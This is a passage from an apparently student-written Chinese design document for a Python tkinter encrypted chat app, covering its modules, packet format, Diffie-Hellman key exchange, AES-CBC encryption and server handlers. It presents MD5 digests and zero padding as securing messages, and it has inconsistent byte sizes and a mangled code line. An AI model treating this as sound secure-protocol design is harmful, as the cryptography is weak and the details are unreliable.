<li>注册模块RegisterForm<br>该模块只有在登录界面点击注册按钮时才会显示。通过注册窗口获得用户输出的个人信息：用户名、密码、邮箱、性别、年龄，若其中用户名、邮箱、密码为空或两次密码输入不一致则会提示相应的错误以引导用户进行正确的输入，否则将获取用户输入打包成注册请求消息(MessageType.register)发送给服务器。服务器查找数据库判断是否用户名已经注册过，发送不同反馈给用户，若data[‘type’]为username_taken，则用户名已被注册，若data[‘type’]为MessageType.register_successful则注册成功，并且在客户端生成证书包含用户的用户名，邮箱，公钥。</li>
<li>主界面ContactsForm<br>该模块在用户登录成功以后显示。显示好友列表中好友的用户名、在线状态，ip地址及端口号等。下方的按钮有添加好友、删除好友、添加群聊、创建群聊。可以点击相应的按钮进行相应的操作，发给服务器相应的数据包，服务器接收到数据包后进行解析，根据不同类型进行event_handler。若点击好友列表或群聊即可跳出聊天界面进行聊天。未读的消息会用红点标注，根据最后一条消息的发送时间来对好友列表排序。</li>
<li>.聊天界面ChatForm<br>该模块是用户与好友聊天的界面。当用户在好友列表中点击好友列表时，即向好友发出聊天，服务器收到聊天请求后寻找对方的证书，找到对方的公钥，双方使用Diffie-Hellman算法协商算法，然后利用AES加密消息保证消息的机密性，MD5生成消息摘要验证保证消息的完整性。另外还可以更改聊天过程中字体的大小和颜色，支持多行输入，支持发送文件，以图片为例，将保存聊天过程中的接收到的图片，并识别其格式。</li>
<li>客户端部件(components)模块<br>该模块实现tkinter静态部件添加和滚动模块的实现。</li>
<li>客户端memory管理模块(memory)<br>该模块用于初始化tkinter对象tk的属性，如窗口，secure_channel对象等。</li>
<li>多用(util)中的socket_listener模块<br>该模块用于客户端处理消息类型，文本或其他。以及不断循环建立连接socket接收消息，实现数据包的完整接收。定义处理给好友框，消息框更新历史消息的函数，事件操作的监听函数和移除函数，消息的监听函数和移除函数。可以实现接收数据并且拼成块，更新聊天的历史记录，通知客户端更新contacts界面上的最后一条消息的内容，时间，未读消息的数目等。</li>
</ol>
</li>
<li><p>集中服务器server</p>
<ol>
<li>event_handler模块<br>该模块分为11个部分，分别具体处理客户端发来的各个操作事件。如登录加好友删除好友等操作。</li>
<li>database数据库模块<br>该模块主要是根据客户端触发的事件对数据库的各种操作。</li>
<li>broadcast广播模块<br>该模块主要是针对群聊，为群组中的每个在线用户广播发送消息。</li>
<li>memory模块<br>定义用户与secure_channel对象互相映射的字典列表，所有已经建立的secure_channel对象，以及用户下线后将其从在线secure_channel对象列表中移除的操作。</li>
</ol>
</li>
<li><p>客户端服务器公用模块common</p>
<ol>
<li>message模块<br>将变量数据等变成可存储或者传输的过程即序列化，同时还将各个事件的类型变为枚举变量保存，将收到的数据包反序列化进行恢复，再提取数据包中Message的类型。</li>
<li>cryptography模块<br>用于调用其生成公钥，然后从证书中获取公钥，再使用D-H算法协商生成共享密钥。</li>
<li>prime模块<br>该模块主要是判断是否为素数，生成大素数，为证书的生成提供基础。</li>
<li>secure_channel模块<br>该模块主要是定义secure_channel类，即包裹了socket和参数秘钥的封装对象。在通信对象之间协商好对称加密秘钥之后封装在这个新的对象中。并且这个对象对数据有新的函数功能：<ul>
<li>send函数<br>用于对发送的序列化之后的数据用对称加密秘钥进行AES加密并用struct结构体将其打包成自设协议格式的数据包。</li>
<li>on_data<br>函数主要用于接受数据的逆向解析。按照要求配置socket和数据传输的格式进行规则化。数据包的格式为前四个字节为消息体的长度，接着一字节存储AES加密时的消息填充长度，然后16字节AES加密时所需要的初始值，再接着是32字节的消息摘要，最后才是加密后的消息体。</li>
</ul>
</li>
</ol>
</li>
</ol>
<h3 id="重要数据说明"><a href="#重要数据说明" class="headerlink" title="重要数据说明"></a>重要数据说明</h3><ol>
<li><p>发送接收的数据格式</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714133500.png"></p>
</li>
<li><p>接收数据时的三个字典</p>
<ol>
<li>bytes_to_receive={}——用于存储对应用户id或者服务器的将要接收的数据；</li>
<li>bytes_received={}——用于标识已经接收的数据；</li>
<li>data_buffer={}——用于将已经接收的数据解密，反序列化生成最初的数据字符串。</li>
</ol>
</li>
<li><p>全局都在引用的数据</p>
<ol>
<li>sc_to_user_id={}——表示映射关系为sc-&gt;user_id的字典；</li>
<li>user_id_to_sc={}——表示映射关系为user_id-&gt;的字典；</li>
<li>socket_to_sc={}——表示socket和已生成sc对象的映射关系字典；</li>
<li>scs=[]——存储所有运行出来的sc(secure_channel)对象；</li>
<li>chat_history=[]——用于暂时存储聊天信息历史。</li>
</ol>
</li>
<li><p>客户端接收到的数据data</p>
<p>data是一部字典，它包括key:parameters，type.parameters也是一部字典，内部包括key:target_type，time，sender_id(发送者id)，target_id(接收方id)，sender_name(接收者姓名，message字典(内含数据内容，字体，字体大小颜色)。而外层的这个type存储的是交给server的MessageType类型，如果是不同的MessageType会进行不同的数据库操作和客户端操作。具体实例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data={</span><br><span class="line">	'parameters':{</span><br><span class="line">        'target_type':0,</span><br><span class="line">        'time':1562754761321,</span><br><span class="line">        'sender_id':1,</span><br><span class="line">        'target_id':2,</span><br><span class="line">        'sender_name':'1',</span><br><span class="line">        'message'{</span><br><span class="line">            'data':'hello',</span><br><span class="line">            'fontsize':10,</span><br><span class="line">            'type':0,</span><br><span class="line">            'fontcolor':'#000000'</span><br><span class="line">        }</span><br><span class="line">    },</span><br><span class="line">	'type':&lt;MessageType.on_new_message:109&gt;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>例子中data[‘parameters’][‘target_type’]=0表示文本信息，从id为1的用户发出信息，发给id标号为2的人，发送方昵称为‘1’。给服务器发送的操作码为109。</p>
</li>
</ol>
<h3 id="安全传输"><a href="#安全传输" class="headerlink" title="安全传输"></a>安全传输</h3><ol>
<li><p>数据包结构</p>
<ol>
<li><p>消息加密算法：AES对称加密算法，保证消息机密性</p>
</li>
<li><p>消息摘要算法：MD5算法，保证消息的完整性</p>
</li>
<li><p>包结构分析</p>
<ol>
<li><p>第一层(解密前)</p>
<p>通过函数struct.pack()构造加密的数据包，结构如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714134257.png"></p>
<p>相关代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">iv1=<span class="built_in">bytes</span>(os.urandom(<span class="number">16</span>))</span><br><span class="line">	data_to_encrypt=serialize_message(message_type,parameters)</span><br><span class="line">length_of_message=<span class="built_in">len</span>(data_to_encrypt)</span><br><span class="line">padding_n=math.ceil(length_of_message/<span class="number">16</span>)*<span class="number">16</span>-length_of_message</span><br><span class="line">	foriinrange(<span class="number">0</span>,padding_n):</span><br><span class="line">		data_to_encrypt+=<span class="string">b'\0'</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中iv1是16字节随机数作为初始向量。要加密的数据是序列化的初始数据。获取长度后用\0填充。然后将数据用python库函数aes，cbc模式加密得到加密数据。</p>
</li>
<li><p>第二层(解密后)</p>
<p>结构如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714134437.png"></p>
<ul>
<li><p>MessageType：event_handler_map()规定的操作码</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714134505.png"></p>
</li>
<li><p>Parameter：字典参数，包含target_type(标志群聊或者私聊)等</p>
</li>
</ul>
</li>
<li><p>第三层，序列化数据的安排格式</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714134543.png"></p>
</li>
<li><p>第四层，基础数据部分</p>
<p>包括int、str、bool、float、binary等</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714134625.png"></p>
</li>
</ol>
</li>
</ol>
</li>
<li><p>密钥分发</p>
<ol>
<li><p>协商过程</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714134751.png"></p>
<p>客户端的证书、公钥、私钥</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714134808.png"></p>
</li>
<li><p>加密算法</p>
<p>采用DH协商对称加密的共享密钥，具体过程如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714134732.png"></p>
</li>
</ol>
</li>
</ol>
<h3 id="程序函数清单"><a href="#程序函数清单" class="headerlink" title="程序函数清单"></a>程序函数清单</h3><h4 id="客户端函数"><a href="#客户端函数" class="headerlink" title="客户端函数"></a>客户端函数</h4><ol>
<li><p>socket_listener(self,data)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/register_form.py</li>
<li>client/forms/login_form.py</li>
<li>client/forms/contacts_form.py</li>
<li>client/forms/chat_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在的类的自身</li>
<li>data：监听数据</li>
</ul>
</li>
<li><p>功能</p>
<p>在注册、登录、好友列表、聊天框四个页面建立事件监听，解析监听data，确定数据中MessageType的类型，在register_form.py文件中用于判断用户名是否被占用、返回注册结果；在login_form.py中用于返回登录结果；在contacts_form.py文件中用于判断是否处理添加、删除好友、添加、创建群聊以及执行操作的结果、判断好友是否下线并刷新好友列表。</p>
</li>
</ul>
</li>
<li><p>remove_socket_listener_and_close(self)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/register_form.py</li>
<li>client/forms/login_form.py</li>
<li>client/forms/contacts_form.py</li>
<li>client/forms/chat_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在的类的自身：RegisterForm、LoginForm、ContactsForm、ChatForm</li>
</ul>
</li>
<li><p>功能</p>
<p>通过调用util/socket_listener文件下的remove_listener函数来关闭事件监听，同时调用库函数destroy()关闭窗口、清空客户端缓存信息。</p>
</li>
</ul>
</li>
<li><p>_<em>init</em>_(self,master=None)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/register_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类RegisterForm自身</li>
<li>master：注册主窗口用来容纳其他组件,默认一个窗口master=None</li>
</ul>
</li>
<li><p>功能</p>
<p>通过库函数super()实现子类__init__()对父类__init__()的继承；对注册窗口进行布局，包括确定注册界面的长宽，确定背景、标签、输入框、按钮等的位置、颜色、类型、链接等；初始化安全信道；通过socket_listener()函数和remove_socket_listener_and_close()函数控制对客户端socket事件监听和关闭。</p>
</li>
</ul>
</li>
<li><p>do_register(self)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/register_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类RegisterForm自身</li>
</ul>
</li>
<li><p>功能</p>
<p>检查输入的用户名、密码、邮箱是否合法；判断两次输入的密码是否相同；调用get_ip()函数获取客户端的IP地址和端口号；向服务器发送注册请求，并通过调用函数send()将注册输入的用户名、密码、邮箱、性别、年龄以及用户的IP地址和端口号等信息发送给服务器；构造数字证书，命名为IP地址+“——cert.pem”，内容为用户名+邮箱+用户公钥</p>
</li>
</ul>
</li>
<li><p>._<em>init</em>_(self,master=None)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/login_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类RegisterForm自身</li>
<li>master：登录主窗口用来容纳其他组件,默认一个窗口master=None</li>
</ul>
</li>
<li><p>功能</p>
<p>通过库函数super()实现子类__init__()对父类_<em>init</em>_()的继承；对登录窗口进行布局，包括确定注册界面的长宽，确定背景、标签、输入框、按钮等的位置、颜色、类型、链接等；初始化安全信道；通过socket_listener()函数和add_listener()函数将服务器端加入到监听列表中。</p>
</li>
</ul>
</li>
<li><p>do_login(self)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/login_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>参数self：所在类LoginForm自身</li>
</ul>
</li>
<li><p>功能</p>
<p>检查输入的用户名、密码是否合法；通过调用函数send()向服务器发送登录请求，并将输入的用户名、密码等信息发送给服务器。</p>
</li>
</ul>
</li>
<li><p>show_register(self)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/login_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类LoginForm自身</li>
</ul>
</li>
<li><p>功能</p>
<p>与注册按钮关联，通过点击按钮调用库函数Toplevel()跳转到注册页面。</p>
</li>
</ul>
</li>
<li><p>._<em>init</em>_(self,master=None)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/contacts_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类ContactsForm自身</li>
<li>master：登录主窗口用来容纳其他组件,默认一个窗口master=None。</li>
</ul>
</li>
<li><p>功能</p>
<p>通过库函数super()实现子类_<em>init__()对父类__init</em>_()的继承；对好友列表窗口布局，确定好友列表的长宽、按钮的位置、颜色、类型、链接等；调用VerticalScrolledFrame()函数，将列表设置滚动条＋图片背景；初始化安全信道；通过socket_listener()函数和remove_socket_listener_and_close()函数控制对客户端socket事件监听和关闭。</p>
</li>
</ul>
</li>
<li><p>refresh_contacts(self)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/contacts_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类ContactsForm自身</li>
</ul>
</li>
<li><p>功能</p>
<p>通过比较与好友或群聊最近一次发消息的时间last_message_timestamp和好友的在线情况刷新好友列表，根据好友或群聊发送消息的时间远近对好友列表进行排列，并将在线好友移至列表顶部</p>
</li>
</ul>
</li>
<li><p>on_add_friend(self)/on_del_friend(self)/on_add_room(self)on_create_room(self)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/contacts_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类ContactsForm自身</li>
</ul>
</li>
<li><p>功能</p>
<p>与添加好友、删除好友、添加群聊、创建群聊四个按钮链接；使用库函数simpledialog.askstring()弹出输入框，并对输入的内容进行检验；使用函数send()向服务器发送操作请求。</p>
</li>
</ul>
</li>
<li><p>handle_new_contact(self,data)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/contacts_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类ContactsForm自身</li>
<li>data：接收的数据</li>
</ul>
</li>
<li><p>功能</p>
<p>被该文件下的另一个函数__init__()调用用来添加或删除列表中的好友。</p>
</li>
</ul>
</li>
<li><p>_<em>init</em>_(self,target,master=None)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/chat_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类ChatFrame自身</li>
<li>target：一个用来暂时存储消息的列表</li>
<li>master：聊天框主窗口用来容纳其他组件,默认一个窗口master=None</li>
</ul>
</li>
<li><p>功能</p>
<p>对聊天框布局，确定聊天框的长宽、输入框、消息框、按钮的位置、颜色、类型、链接等；分辨私人聊天和群聊；利用append_to_chat_box()函数加载、更新历史消息。</p>
</li>
</ul>
</li>
<li><p>send_message(self)/send_file(self)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/chat_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类ChatFrame自身</li>
</ul>
</li>
<li><p>功能</p>
<p>通过调用input_textbox.get()函数和filedialog.askopenfilename()函数实现发送消息和文件。</p>
</li>
</ul>
</li>
<li><p>digest_message(self,data)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/forms/chat_form.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类ChatFrame自身</li>
<li>data：传输的数据</li>
</ul>
</li>
<li><p>功能</p>
<p>通过分析传输的数据包，摘取消息的时间戳、发送者、消息类型，为布局做准备。</p>
</li>
</ul>
</li>
<li><p>_<em>init</em>_(self,parent,onclick)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/components/contact_item.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类ContactItem自身</li>
<li>parent：向函数内定义的子类传递的参数</li>
<li>onclick：跳转动作</li>
</ul>
</li>
<li><p>功能</p>
<p>位于ContactItem类中，对好友列表中的每一行进行布局如</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200714140712.png"></p>
</li>
</ul>
</li>
<li><p>_<em>init</em>_(self,parent,*args,**kw)</p>
<ul>
<li><p>位置</p>
<ul>
<li>client/components/vertical_scrolled_frame.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self：所在类VerticalScrolledFrame自身</li>
<li>parent：向函数内定义的子类传递的参数</li>
<li>*args：可变参数</li>
<li>**kw：关键字参数</li>
</ul>
</li>
<li><p>功能</p>
<p>利用Scrollbar()函数创建一个带有滚动条的画布，并可以通过滚动条对画布及时更新。</p>
</li>
</ul>
</li>
</ol>
<h4 id="common函数"><a href="#common函数" class="headerlink" title="common函数"></a>common函数</h4><ol>
<li><p>gen_secret()</p>
<ul>
<li><p>位置</p>
<ul>
<li>common\cryptography\crypt.py</li>
</ul>
</li>
<li><p>功能</p>
<p>产生用户的公钥私钥</p>
</li>
<li><p>算法描述</p>
<p>利用prime.generate_big_prime()函数产生一个大的素数作为私钥，然后利用相应算法计算出自己的公钥，将公钥和私钥保存成文件，公钥可写入证书，私钥单独保存不传输</p>
</li>
</ul>
</li>
<li><p>_serialize_xxx(xxx)</p>
<ul>
<li><p>位置</p>
<ul>
<li>common\message_<em>init</em>_.py</li>
</ul>
</li>
<li><p>参数：要序列化的数据类型</p>
</li>
<li><p>功能</p>
<p>针对传入的不同数据类型进行序列化算法描述：对不同数据类型进行序列化成二进制然后返回统一格式的数据，方便进行数据的传输和存好友的用户名和在线状态最近一次消息时间好友的IP地址和端口号消息内容未读消息计数储。每个序列化后的数据格式为：|——VAR_TYPE(1Byte)——|——DATA_LEN(4Bytes)——|——DATA——|。即1字节数据类型，4字节数据长度和数据部分。</p>
<p>主要用_serialize_list(list):_serialize_list(list)数据打包格式如下：|——1ByteTypeofparams——|——4BytesLengthofbody——|——Body(self-evidentlength)——|——Body(selfevidentlength)——|——Body(self-evidentlength)——|..即第一字节为列表类型，然后4字节的数据长度，由每种数据类型占用长度不同分配不同的BODY长度，每一个BODY可以是如list,int,float等数据类型。</p>
</li>
</ul>
</li>
<li><p>_deserialize_xxx(bytes)</p>
<ul>
<li><p>位置</p>
<ul>
<li>common\message_<em>init</em>_.py</li>
</ul>
</li>
<li><p>参数：二进制数据</p>
</li>
<li><p>功能</p>
<p>针对传入的不同数据类型数据进行反序列化成原本数据</p>
</li>
<li><p>算法描述</p>
<p>对二进制进行反序列成指定的数据类型，即是_serialize_xxx的逆过程，可用于解析数据包。</p>
</li>
</ul>
</li>
<li><p>send(self,message_type,parameters=None)</p>
<ul>
<li><p>位置</p>
<ul>
<li>common\transmission\secure_channel.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self即为SecureChannel类</li>
<li>message_type即为消息的类型</li>
</ul>
</li>
<li><p>功能</p>
<p>按照自制的协议组织数据包发送数据包</p>
</li>
<li><p>算法描述</p>
<p>数据包的格式为前四个字节为消息体的长度，接着一字节存储AES加密时的消息填充长度，然后16字节AES加密时所需要的初始值，再接着是32字节的消息摘要，最后才是加密后的消息体。</p>
</li>
</ul>
</li>
<li><p>on_data(self,data_array)</p>
<ul>
<li><p>位置</p>
<ul>
<li>common\transmission\secure_channel.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>self即为SecureChannel类</li>
<li>data_array即为字节数组</li>
</ul>
</li>
<li><p>功能</p>
<p>解析数据包，并利用mac验证消息的完整性</p>
</li>
<li><p>算法描述</p>
<p>首先把bytes([padding_n])+iv1+encrypted_message传给本函数，然后得到消息体，和消息摘要，接收方对消息利用相同的算法计算其消息摘要，验证消息是否被篡改最后对消息解密，返回解密后的反序列化后的原始数据。</p>
</li>
</ul>
</li>
<li><p>establish_secure_channel_to_server()</p>
<ul>
<li><p>位置</p>
<ul>
<li>common\transmission\secure_channel.py</li>
</ul>
</li>
<li><p>功能</p>
<p>与集中服务器建立安全信道</p>
</li>
<li><p>算法描述</p>
<p>客户端首先获取本机的ip地址，生成自己的私钥公钥和证书，首次连接的时候要给服务器发送证书，计算出二者的共同密钥。</p>
</li>
</ul>
</li>
<li><p>accept_client_to_secure_channel(socket)</p>
<ul>
<li><p>位置</p>
<ul>
<li>common\transmission\secure_channel.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>socket：客户端和服务器通信的socket</li>
</ul>
</li>
<li><p>功能</p>
<p>服务器接收客户端建立安全信道</p>
</li>
<li><p>算法描述</p>
<p>首次连接，客户端会发送公钥，把服务器的证书发送给客户端，二者计算出共同密钥。</p>
</li>
</ul>
</li>
<li><p>gen_last_message(obj)</p>
<ul>
<li><p>位置</p>
<ul>
<li>common\utli\socket_listener\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>obj为传输数据data的obj类型</li>
</ul>
</li>
<li><p>功能</p>
<p>获取对象中message的类型，0表示文字信息，1表示图片信息</p>
</li>
<li><p>算法描述</p>
<p>obj[‘message’][‘type’]判断0与1.type0-文字消息1-图片消息。</p>
</li>
</ul>
</li>
<li><p>socket_listener_thread(sc,tk_root)</p>
<ul>
<li><p>位置</p>
<ul>
<li>common\socket_listener__init.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>sc是已经建立的C-S安全socket，socket_channel,带有对称秘钥</li>
<li>tk_root是tkinter界面对象。</li>
</ul>
</li>
<li><p>功能</p>
<p>循环接收信息，进入socket监听状态，当接受到信息后完整的接收数据包并从中获取操作码，根据操作码的不同进行不同的处理。</p>
</li>
<li><p>算法描述</p>
<p>使用select.select函数阻塞运行，当有处理时不会被其他人占用。其中接受数据有三个变量：</p>
<ul>
<li>bytes_to_receive=0</li>
<li>bytes_received=0</li>
<li>data_buffer=bytes()</li>
</ul>
<p>当bytes_to_receive=0、bytes_received=0时表示正准备接受一个新的socket数据。开始接收后会通过数据包前四个字节判断长度。如果长度小于四字节说明是损坏的包或者是空包，没有数据，表示服务器已关闭。通过指针[0]+1+16使指针指向数据部分。+1是aes的填充部分1字节，+16是aes初始向量4字节。直到接收完毕为止。接受完会把数据包解包取出数据部分，并不断拼接形成完整数据字符串。</p>
</li>
</ul>
</li>
<li><p>digest_message(data,update_unread_count=True)</p>
<ul>
<li><p>位置</p>
<ul>
<li>common\socket_listene\__init__.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>data是要放入的历史数据</li>
<li>update_unread_count初始参数设置为True使消息未读数自增</li>
</ul>
</li>
<li><p>功能</p>
<p>实现将历史数据放入chat_history列表中，更新最新消息，消息时间，消息未读数量，并更新用户的好友列表，在前端进行刷新，更新聊天窗口。</p>
</li>
<li><p>算法描述</p>
<p>通过if像chat_history中的数据填入以前的数据。将data更新用于发送。</p>
</li>
</ul>
</li>
<li><p>add_listener(func)</p>
<ul>
<li><p>位置</p>
<ul>
<li>common\socket_listener\<em>_init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>func是一个函数</li>
</ul>
</li>
<li><p>功能</p>
<p>将某一函数事件放入执行列表中，之后会被逐个调用</p>
</li>
<li><p>算法描述</p>
<p>将func函数append到callback_funcs待执行函数列表中。</p>
</li>
</ul>
</li>
<li><p>remove_listener(func)</p>
<ul>
<li><p>位置</p>
<ul>
<li>common\socket_listener__init__.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>func是一个函数</li>
</ul>
</li>
<li><p>功能</p>
<p>将某一函数事件从执行列表中移除</p>
</li>
<li><p>算法描述</p>
<p>列表的remove操作</p>
</li>
</ul>
</li>
</ol>
<h4 id="服务器端函数"><a href="#服务器端函数" class="headerlink" title="服务器端函数"></a>服务器端函数</h4><ol>
<li><p>handler_event</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\event_handler_<em>init</em>_.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>sc：即为相应的socket；</li>
<li>event_type：即为事件的类型；</li>
<li>parameters：相应事件中包含的参数。</li>
</ul>
</li>
<li><p>功能</p>
<p>将不同类型的event映射到相应的事件处理操作上，比如将MessageType.login映射到执行login的处理操作上。</p>
</li>
<li><p>算法描述</p>
<p>主要是利用map根据提供的函数对指定事件做映射。</p>
</li>
</ul>
</li>
<li><p>run</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\event_handler\login.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>sc：相应的socket</li>
<li>parameters：从客户端传入的相关参数</li>
</ul>
</li>
<li><p>功能</p>
<p>客户端点击登录按钮后，集中服务器进行用户登录后的相关操作。</p>
</li>
<li><p>算法描述</p>
<p>首先从传入的参数中得到用户的username和对应的password，继而得到对数据库的控制操作权限，查询该用户是否存在，用户名和密码是否匹配。若返回值为0，则为客户端发送MessageType.login_failed。下一步查看该用户是否已经登入，若已登入则踢下线，否则登录成功，向客户端发送MessageType.login_successful。登录成功后向客户端发送好友列表，通知他的好友他已上线，最后从数据库中读出他的聊天记录，将其和好友列表一起作为login_bundle的参数发送给客户端。</p>
</li>
</ul>
</li>
<li><p>run</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\event_handler\register.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>sc：相应的socket；</li>
<li>parameters：从客户端传入的相关参数</li>
</ul>
</li>
<li><p>功能</p>
<p>客户端点击注册按钮后，集中服务器进行用户注册后的相关操作</p>
</li>
<li><p>算法描述</p>
<p>首先从传入的参数中获取用户名，继而得到对数据库的控制操作权限，查询该用户名是否已被注册，若被注册则向客户端发送MessageType.username_taken，否则的话传入的参数中获取用户的ip，重写用户生成的证书，然后再把用户的信息插入到数据库中。</p>
</li>
</ul>
</li>
<li><p>run</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\event_handler\add_friend.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>sc：相应的socket；</li>
<li>parameters：从客户端传入的相关参数</li>
</ul>
</li>
<li><p>功能</p>
<p>客户端点击添加好友输入好友用户名后，集中服务器进行用户添加好友后的相关操作</p>
</li>
<li><p>算法描述</p>
<p>首先从传入的参数中得到用户的username，继而得到对数据库的控制操作权限，查询该用户是否存在，若不存在向客户端发送MessageType.add_friend_result，并提示用户“用户名不存在”，否则根据用户名找到用户id，判断其是否为自己的id，则提示用户”不能加自己为好友“。再下一步查询用户自己的id和好友id是否已在friends表中，若存在，则提示用户“已经是好友/已经发送过好友请求”，否则的话将用户自己的id和好友id插入到friends表中，但是accpted的值为0，因为此时还不清楚对方是否同意添加你为好友。然后向用户发送MessageType.add_friend_result，值为true。最后若对方在线，则向其发送MessageType.incoming_friend_request，让对方处理添加好友的请求。</p>
</li>
</ul>
</li>
<li><p>run</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\event_handler\resolve_friend_request.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>sc：相应的socket；</li>
<li>parameters：从客户端传入的相关参数</li>
</ul>
</li>
<li><p>功能</p>
<p>当有用户向目标用户发送好友添加请求时,服务器处理好友请求操作</p>
</li>
<li><p>算法描述</p>
<p>首先从传入的参数中得到uid，继而得到对数据库的控制操作权限，查询friends表中好友关系(accepted状态为0)是否在数据库中已存在，若不存在也不进行相关操作。若拒绝添加好友，则将数据库中的该条数据删除，若同意加为好友，则更新friends表accepted为1，并且在数据库中添加双向关系。并给客户端发送MessageType.contact_info，在好友列表中显示添加成功的好友。若对方在线，也发送MessageType.contact_info，在好友列表中显示添加成功的新好友。</p>
</li>
</ul>
</li>
<li><p>run</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\event_handler\del_friend.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>sc：相应的socket；</li>
<li>parameters：从客户端传入的相关参数</li>
</ul>
</li>
<li><p>功能</p>
<p>客户端点击删除好友，输入好友用户名后，集中服务器进行用户删除好友后的相关操作。</p>
</li>
<li><p>算法描述</p>
<p>首先从传入的参数中得到用户的username，继而得到对数据库的控制操作权限，查询该用户是否存在，若不存在向客户端发送MessageType.add_friend_result，并提示用户“用户名不存在”，否则根据用户名找到用户id，判断其是否为自己的id，则提示用户”不能删除自己“。再下一步判断对方是否是自己的好友，查询用户自己的id和好友id是否已在friends表中，若不存在，则提示用户“该用户还不是您的好友”，若对方是自己的好友，则在friends表中删除二者的好友关系，并向客户端发送MessageType.del_info，使删除的好友在好友列表中消失。若对方在线，也发送MessageType.del_info，使自己在对方好友列表中也消失，实现双向的删好友功能。</p>
</li>
</ul>
</li>
<li><p>run</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\event_handler\create_room.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>sc：相应的socket；</li>
<li>parameters：从客户端传入的相关参数</li>
</ul>
</li>
<li><p>功能</p>
<p>客户端点击创建群组聊天，输入群组名后，集中服务器进行创建群组的相关操作。</p>
</li>
<li><p>算法描述</p>
<p>首先获取user_id，然后将该群聊加入数据库rooms中，并且向客户端发送MessageType.contact_info，使用户在好友列表中显示群聊。最后向客户端发送MessageType.general_msg，提示用户创建群聊成功，并显示群号。</p>
</li>
</ul>
</li>
<li><p>run</p>
<ul>
<li><p>位置</p>
<ul>
<li>server\event_handler\join_room.py</li>
</ul>
</li>
<li><p>参数</p>
<ul>
<li>sc：相应的socket；</li>
<li>parameters：从客户端传入的相关参数</li>
</ul>
</li>
<li><p>功能</p>
<p>客户端点击添加群组聊天，输入群组名后，集中服务器进行添加群聊的相关操作。</p>
</li>
<li><p>算法描述</p>
